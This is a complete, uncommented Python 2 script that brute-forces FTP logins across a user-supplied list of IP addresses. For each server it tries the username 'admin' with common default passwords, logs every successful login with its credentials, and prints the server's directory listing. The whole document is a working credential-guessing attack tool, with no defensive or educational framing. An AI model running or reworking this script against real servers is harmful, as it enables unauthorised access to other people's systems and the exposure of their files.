import socket
import sys
import re
import ftplib
import datetime

today = datetime.date.today()
date = today.strftime("%d-%m-%y")


username = "admin"


IPlist = raw_input("Specify the IP list: ")
for server in open(IPlist, "r").readlines():
    try:
        for password in ["admin", "12345", "password", "test"]:
            ftp = ftplib.FTP(server, timeout=5)
            welcome = ftp.getwelcome()
            print welcome
            try:
                attempt = ftp.login(user=username, passwd=password)
                log_file = open("PYTHONB_LOG_"+date+".txt", "a")
                success = ("[*] Login found |---"  + username + " " + password + " ---| " + server + '\n')
               	log_file.write(welcome + success)
                log_file.close()
                
                print success 
                data = []
                ftp.dir(data.append)
                for lines in data:
                    print lines
                

            except:
                print server, username, password
                pass


    except:
        print
        print "Timeout.."


